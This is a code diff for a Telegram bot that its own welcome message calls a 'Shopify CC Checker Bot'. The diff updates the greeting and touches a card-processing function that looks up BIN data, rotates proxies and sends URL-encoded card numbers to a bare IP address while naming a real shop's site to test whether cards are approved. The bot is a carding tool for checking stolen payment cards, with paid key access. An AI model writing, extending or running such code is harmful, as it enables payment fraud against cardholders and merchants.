@@ -118,7 +118,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     ALL_USERS.add(user.id)
     save_data()
-    await update.message.reply_text(f"Hello {user.first_name}!\n🤖 3-API & Multi-Proxy Bot Online.\nUse /redeem <key>.")
+    
+    # User's actual name dynamically added here
+    welcome_text = (
+        f"Hello {user.first_name}!\n\n"
+        f"🤖 Shopify CC Checker Bot is Online (Dual-API Active)\n"
+        f"⚠️ Use /redeem <key> to activate access.\n"
+        f"👑 Owner: {OWNER_USERNAME}"
+    )
+    await update.message.reply_text(welcome_text)
 
 async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if is_any_admin(update.effective_user.id):
@@ -236,8 +244,6 @@ async def process_card_string(card_line, user_full_name):
         bin_info, bank_info, country_info = await get_bin_info(cc[:6])
         
         site_url = "https://ripnroll.com"
-        
-        # Pick 3 non-repeating proxies for the 3 distinct APIs
         selected_proxies = random.sample(PROXY_LIST, min(3, len(PROXY_LIST)))
         
         res_data = None
@@ -262,7 +268,7 @@ async def process_card_string(card_line, user_full_name):
                 except Exception:
                     pass
 
-            # --- API 3: Custom IP API (Aapki di gayi API format) ---
+            # --- API 3: Custom IP API ---
             if not res_data or str(res_data.get("Approved", "False")).lower() != "true":
                 api_url_3 = f"http://216.250.119.63/?{quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
                 try:
